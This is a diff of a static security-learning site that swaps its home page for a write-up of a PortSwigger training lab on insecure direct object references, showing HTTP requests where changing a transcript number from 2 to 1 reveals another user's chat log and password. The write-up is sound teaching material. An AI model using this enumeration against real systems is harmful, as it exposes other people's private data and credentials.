@@ -12,34 +12,36 @@
         <meta name="author" content="Tom Fieber">
       
       
-        <link rel="canonical" href="https://tomfieber.github.io/references/">
+        <link rel="canonical" href="https://tomfieber.github.io/references/resources/PortSwigger/Authorization/authz-lab-9/">
       
       
+        <link rel="prev" href="../authz-lab-5/">
       
-        <link rel="next" href="Interview-Questions/">
+      
+        <link rel="next" href="../../SQL-Injection/_cheatsheet/">
       
       
         
       
       
-      <link rel="icon" href="assets/images/favicon.png">
+      <link rel="icon" href="../../../../assets/images/favicon.png">
       <meta name="generator" content="zensical-0.0.5">
     
     
       
-        <title>Home - pawpawhacks</title>
+        <title>Insecure direct object references - pawpawhacks</title>
       
     
     
       
         
       
-      <link rel="stylesheet" href="assets/stylesheets/modern/main.1357c24d.min.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/modern/main.1357c24d.min.css">
       
         
           
         
-        <link rel="stylesheet" href="assets/stylesheets/modern/palette.dfe2e883.min.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/modern/palette.dfe2e883.min.css">
       
       
   
@@ -87,9 +89,9 @@
       
     
     
-      <link rel="stylesheet" href="stylesheets/extra.css">
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
     
-    <script>__md_scope=new URL(".",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -114,7 +116,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#about-me" class="md-skip">
+        <a href="#insecure-direct-object-references" class="md-skip">
           Skip to content
         </a>
       
@@ -130,7 +132,7 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="." title="pawpawhacks" class="md-header__button md-logo" aria-label="pawpawhacks" data-md-component="logo">
+    <a href="../../../.." title="pawpawhacks" class="md-header__button md-logo" aria-label="pawpawhacks" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
@@ -150,7 +152,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Home
+              Insecure direct object references
             
           </span>
         </div>
@@ -220,9 +222,7 @@
           
             
               
-                
-              
-              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                 <div class="md-sidebar__scrollwrap">
                   <div class="md-sidebar__inner">
                     
@@ -231,7 +231,7 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="." title="pawpawhacks" class="md-nav__button md-logo" aria-label="pawpawhacks" data-md-component="logo">
+    <a href="../../../.." title="pawpawhacks" class="md-nav__button md-logo" aria-label="pawpawhacks" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
@@ -246,35 +246,10 @@
       
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Home
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="." class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
         
   
   
@@ -290,47 +265,6 @@
   
 
       </a>
-      
-        
-
-
-<nav class="md-nav md-nav--secondary" aria-label="On this page">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      On this page
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#about-me" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        About Me
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#my-philosophy" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        My Philosophy
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -367,7 +301,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="Interview-Questions/" class="md-nav__link ">
+            <a href="../../../../Interview-Questions/" class="md-nav__link ">
               
   
   
@@ -464,7 +398,7 @@
   
   
     <li class="md-nav__item">
-      <a href="Interview-Questions/general/encryption-vs-encoding/" class="md-nav__link">
+      <a href="../../../../Interview-Questions/general/encryption-vs-encoding/" class="md-nav__link">
         
   
   
@@ -541,7 +475,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="projects/" class="md-nav__link ">
+            <a href="../../../../projects/" class="md-nav__link ">
               
   
   
@@ -605,7 +539,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="projects/Web-Development/" class="md-nav__link ">
+            <a href="../../../../projects/Web-Development/" class="md-nav__link ">
               
   
   
@@ -672,7 +606,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="projects/courses/" class="md-nav__link ">
+            <a href="../../../../projects/courses/" class="md-nav__link ">
               
   
   
@@ -723,6 +657,8 @@
       
   
   
+    
+  
   
   
     
@@ -747,15 +683,15 @@
       
     
     
-    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="resources/" class="md-nav__link ">
+            <a href="../../../" class="md-nav__link ">
               
   
   
@@ -779,7 +715,7 @@
             
           </div>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_4">
             <span class="md-nav__icon md-icon"></span>
             
@@ -852,7 +788,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/How-To/Create-an-Ubuntu-VM/" class="md-nav__link">
+      <a href="../../../How-To/Create-an-Ubuntu-VM/" class="md-nav__link">
         
   
   
@@ -996,7 +932,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/Methodology/OWASP-WSTG/wstg/" class="md-nav__link">
+      <a href="../../../Methodology/OWASP-WSTG/wstg/" class="md-nav__link">
         
   
   
@@ -1039,8 +975,10 @@
                 
   
   
+    
   
   
+  
     
     
       
@@ -1056,11 +994,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4" checked>
         
           
           <label class="md-nav__link" for="__nav_4_4" id="__nav_4_4_label" tabindex="0">
@@ -1081,7 +1019,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_4_4">
             <span class="md-nav__icon md-icon"></span>
             
@@ -1164,7 +1102,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/PortSwigger/Authentication/authn-lab-1/" class="md-nav__link">
+      <a href="../../Authentication/authn-lab-1/" class="md-nav__link">
         
   
   
@@ -1192,7 +1130,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/PortSwigger/Authentication/authn-lab-2/" class="md-nav__link">
+      <a href="../../Authentication/authn-lab-2/" class="md-nav__link">
         
   
   
@@ -1220,7 +1158,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/PortSwigger/Authentication/authn-lab-3/" class="md-nav__link">
+      <a href="../../Authentication/authn-lab-3/" class="md-nav__link">
         
   
   
@@ -1248,7 +1186,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/PortSwigger/Authentication/authn-lab-4/" class="md-nav__link">
+      <a href="../../Authentication/authn-lab-4/" class="md-nav__link">
         
   
   
@@ -1276,7 +1214,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/PortSwigger/Authentication/authn-lab-5/" class="md-nav__link">
+      <a href="../../Authentication/authn-lab-5/" class="md-nav__link">
         
   
   
@@ -1304,7 +1242,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/PortSwigger/Authentication/authn-lab-8/" class="md-nav__link">
+      <a href="../../Authentication/authn-lab-8/" class="md-nav__link">
         
   
   
@@ -1332,7 +1270,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/PortSwigger/Authentication/authn-lab-9/" class="md-nav__link">
+      <a href="../../Authentication/authn-lab-9/" class="md-nav__link">
         
   
   
@@ -1365,8 +1303,10 @@
                 
   
   
+    
   
   
+  
     
     
       
@@ -1384,11 +1324,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4_2" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4_2" checked>
         
           
           <label class="md-nav__link" for="__nav_4_4_2" id="__nav_4_4_2_label" tabindex="0">
@@ -1409,7 +1349,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_4_2_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_4_2_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_4_4_2">
             <span class="md-nav__icon md-icon"></span>
             
@@ -1427,7 +1367,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/PortSwigger/Authorization/authz-lab-1/" class="md-nav__link">
+      <a href="../authz-lab-1/" class="md-nav__link">
         
   
   
@@ -1455,7 +1395,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/PortSwigger/Authorization/authz-lab-12/" class="md-nav__link">
+      <a href="../authz-lab-12/" class="md-nav__link">
         
   
   
@@ -1483,7 +1423,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/PortSwigger/Authorization/authz-lab-5/" class="md-nav__link">
+      <a href="../authz-lab-5/" class="md-nav__link">
         
   
   
@@ -1508,10 +1448,37 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="resources/PortSwigger/Authorization/authz-lab-9/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Insecure direct object references
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -1527,6 +1494,49 @@
   
 
       </a>
+      
+        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#instructions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Instructions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Solution
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1610,7 +1620,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/PortSwigger/SQL-Injection/_cheatsheet/" class="md-nav__link">
+      <a href="../../SQL-Injection/_cheatsheet/" class="md-nav__link">
         
   
   
@@ -1638,7 +1648,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/PortSwigger/SQL-Injection/sqli-lab-1/" class="md-nav__link">
+      <a href="../../SQL-Injection/sqli-lab-1/" class="md-nav__link">
         
   
   
@@ -1666,7 +1676,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/PortSwigger/SQL-Injection/sqli-lab-2/" class="md-nav__link">
+      <a href="../../SQL-Injection/sqli-lab-2/" class="md-nav__link">
         
   
   
@@ -1694,7 +1704,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/PortSwigger/SQL-Injection/sqli-lab-3/" class="md-nav__link">
+      <a href="../../SQL-Injection/sqli-lab-3/" class="md-nav__link">
         
   
   
@@ -1722,7 +1732,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/PortSwigger/SQL-Injection/sqli-lab-4/" class="md-nav__link">
+      <a href="../../SQL-Injection/sqli-lab-4/" class="md-nav__link">
         
   
   
@@ -1750,7 +1760,7 @@
   
   
     <li class="md-nav__item">
-      <a href="resources/PortSwigger/SQL-Injection/sqli-lab-5/" class="md-nav__link">
+      <a href="../../SQL-Injection/sqli-lab-5/" class="md-nav__link">
         
   
   
@@ -1802,8 +1812,6 @@
             
             
               
-                
-              
               <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                 <div class="md-sidebar__scrollwrap">
                   <div class="md-sidebar__inner">
@@ -1814,6 +1822,8 @@
   
   
   
+    
+  
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
@@ -1822,10 +1832,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#about-me" class="md-nav__link">
+  <a href="#instructions" class="md-nav__link">
     <span class="md-ellipsis">
       
-        About Me
+        Instructions
       
     </span>
   </a>
@@ -1833,10 +1843,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#my-philosophy" class="md-nav__link">
+  <a href="#solution" class="md-nav__link">
     <span class="md-ellipsis">
       
-        My Philosophy
+        Solution
       
     </span>
   </a>
@@ -1856,54 +1866,190 @@
               
                 
 
+
+
   
 
 
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Home
+  </span>
 
+      </a>
+    </li>
   
 
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Resources
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../Authentication/authn-lab-1/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    PortSwigger
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../authz-lab-1/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Authorization
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
 
               
               <article class="md-content__inner md-typeset">
                 
                   
 
-  <h1>Home</h1>
+<h1 id="insecure-direct-object-references">Insecure direct object references<a class="headerlink" href="#insecure-direct-object-references" title="Permanent link">&para;</a></h1>
+<h2 id="instructions">Instructions<a class="headerlink" href="#instructions" title="Permanent link">&para;</a></h2>
+<p>This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.</p>
+<p>Solve the lab by finding the password for the user <code>carlos</code>, and logging into their account.</p>
+<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">&para;</a></h2>
+<p>This lab has a live chat functionality that allows downloading chat logs. Note the original chat below:</p>
+<div class="language-text highlight"><span class="filename">Original chat transcript</span><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>GET /download-transcript/2.txt HTTP/1.1
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Host: 0a34009c04dc3ab780106cdd00ef003e.web-security-academy.net
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Accept: */*
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>Accept-Encoding: gzip, deflate, br, zstd
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>Referer: https://0a34009c04dc3ab780106cdd00ef003e.web-security-academy.net/chat
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>Connection: keep-alive
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>Cookie: session=u4v7AwzWpRT7ndqhIScxQr6Vig8KFD9P
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>Sec-Fetch-Dest: empty
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>Sec-Fetch-Mode: cors
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>Sec-Fetch-Site: same-origin
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>X-PwnFox-Color: orange
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>Priority: u=0
+</span></code></pre></div>
+<div class="language-text highlight"><span class="filename">Original chat response</span><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>HTTP/1.1 200 OK
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Content-Type: text/plain; charset=utf-8
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Content-Disposition: attachment; filename=&quot;2.txt&quot;
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>X-Frame-Options: SAMEORIGIN
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>Connection: close
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>Content-Length: 44
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>CONNECTED: -- Now chatting with Hal Pline --
+</span></code></pre></div>
+<p>To solve this lab, change the 2 to a 1 and access another user's chat history. </p>
+<div class="language-text highlight"><span class="filename">Modified request</span><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>GET /download-transcript/1.txt HTTP/1.1
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Host: 0a34009c04dc3ab780106cdd00ef003e.web-security-academy.net
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>Accept: */*
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>Accept-Encoding: gzip, deflate, br, zstd
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>Referer: https://0a34009c04dc3ab780106cdd00ef003e.web-security-academy.net/chat
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>Connection: keep-alive
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>Cookie: session=u4v7AwzWpRT7ndqhIScxQr6Vig8KFD9P
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>Sec-Fetch-Dest: empty
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>Sec-Fetch-Mode: cors
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>Sec-Fetch-Site: same-origin
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>X-PwnFox-Color: orange
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>Priority: u=0
+</span></code></pre></div>
+<p>Note the password in the response.</p>
+<div class="language-text highlight"><span class="filename">Modified response</span><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>HTTP/1.1 200 OK
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Content-Type: text/plain; charset=utf-8
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Content-Disposition: attachment; filename=&quot;1.txt&quot;
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>X-Frame-Options: SAMEORIGIN
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>Connection: close
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>Content-Length: 520
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>CONNECTED: -- Now chatting with Hal Pline --
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>You: Hi Hal, I think I&#39;ve forgotten my password and need confirmation that I&#39;ve got the right one
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I&#39;ll confirm whether it&#39;s correct or not.
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>You: Wow you&#39;re so nice, thanks. I&#39;ve heard from other people that you can be a right ****
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>Hal Pline: Takes one to know one
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="hll">You: Ok so my password is 4vtfrzk4f8dgw362vt9v. Is that right?
+</span></span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>Hal Pline: Yes it is!
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>You: Ok thanks, bye!
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>Hal Pline: Do one!
+</span></code></pre></div>
+<p>Log in as carlos to solve the lab.</p>
 
-<p><img alt="" src="attachments/index/file-20251111092156726.png" /></p>
-<h2 id="about-me">About Me<a class="headerlink" href="#about-me" title="Permanent link">&para;</a></h2>
-<p>My name is Tom. I'm a husband, father, and grandfather. After I retired from the Army in 2022, I worked as a penetration tester for a few years before gravitating toward teaching. I'm now in the process of getting my own project off the ground. I started <strong>Eagle Rising Information Security</strong> to provide high-quality foundational cybersecurity content to students (or anyone else getting started). My goal is to present information in an easy to understand way, and in a manner which is accessible for anyone, regardless of where they are in their information security journey. </p>
-<hr />
-<h2 id="my-philosophy">My Philosophy<a class="headerlink" href="#my-philosophy" title="Permanent link">&para;</a></h2>
-<div class="grid">
-<p><img alt="" src="attachments/index/file-20251111091256032.png" /></p>
-<ul>
-<li><strong>Cybersecurity can be learned</strong>. Nobody is born just knowing all this. </li>
-<li>Don't try to learn everything all at once. <strong>Try to get 1% better every day</strong>.</li>
-<li>Everyone learns differently. Try to avoid comparing yourself to others. <strong>You don't owe anyone anything</strong>.</li>
-<li><strong>Find your own flow</strong>.
-<br><br>
-<a class="md-button md-button--primary" href="https://discord.gg/MbgZ6maHbR">Reach out on Discord</a></li>
-</ul>
-</div>
 
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <span class="md-tag">authz</span>
+      
+    
+  </nav>
+
+
+
+
+
+
+
+
+  
   
 
 
 
-
-
-
-
-
-
-  
-  
-
-
-
-
-  
 
 
 
@@ -1929,19 +2075,33 @@
   
     
       
-        
-      
       <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../authz-lab-5/" class="md-footer__link md-footer__link--prev" aria-label="Previous: User ID controlled by request parameter">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                User ID controlled by request parameter
+              </div>
+            </div>
+          </a>
         
         
           
-          <a href="Interview-Questions/" class="md-footer__link md-footer__link--next" aria-label="Next: References">
+          <a href="../../SQL-Injection/_cheatsheet/" class="md-footer__link md-footer__link--next" aria-label="Next: SQL Injection Cheatsheet">
             <div class="md-footer__title">
               <span class="md-footer__direction">
                 Next
               </span>
               <div class="md-ellipsis">
-                References
+                SQL Injection Cheatsheet
               </div>
             </div>
             <div class="md-footer__button md-icon">
@@ -2011,10 +2171,10 @@
       
       
       
-      <script id="__config" type="application/json">{"annotate":null,"base":".","features":["announce.dismiss","content.code.annotate","content.code.copy","content.code.select","content.footnote.tooltips","content.tabs.link","content.tooltips","navigation.footer","navigation.indexes","navigation.instant","navigation.instant.prefetch","navigation.path","navigation.sections","navigation.top","navigation.tracking","search.highlight"],"search":"assets/javascripts/workers/search.5e1f2129.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
